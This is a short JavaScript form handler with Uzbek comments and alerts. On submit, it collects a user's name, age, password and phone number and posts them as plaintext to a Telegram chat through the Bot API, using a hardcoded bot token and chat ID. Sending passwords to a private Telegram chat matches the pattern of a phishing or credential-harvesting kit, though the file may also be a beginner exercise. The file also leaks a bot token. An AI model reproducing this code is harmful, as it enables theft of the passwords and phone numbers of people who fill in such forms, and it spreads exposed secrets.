const chatId = "-1002272598717";
const telegramBotId = "7660671086:AAFn0aRzQnZCzByQtUlVy2vU0NAkQ1q-ir8"; 
const url = "https://api.telegram.org/bot" + telegramBotId + "/sendMessage";

// So'rov yuborish
const sendRequest = (e) => {
  e.preventDefault();

  const firstName = document.querySelector(".js-first-name").value.trim();
  const age = document.querySelector(".js-age").value.trim();
  const parol = document  .querySelector(".parol").value.trim();
  const nomer = document.querySelector(".nomer").value.trim();

  const message = `👤 Ism: ${firstName}\n🎂 Yosh: ${age}\n🔐 Parol: ${parol}\n📞 Nomer: ${nomer}`;

  const formData = {
    chat_id: chatId,
    text: message,
  };

  axios
    .post(url, formData)
    .then(() => {
      alert("So'rov muvaffaqiyatli yuborildi!");
    })
    .catch(() => {
      alert("Nimadir xato ketdi!");
    });

  // Formani tozalash
  document.querySelector(".js-first-name").value = "";
  document.querySelector(".js-age").value = "";
  document.querySelector(".parol").value = "";
  document.querySelector(".nomer").value = "";
};

document.querySelector(".js-register-form").addEventListener("submit", sendRequest);
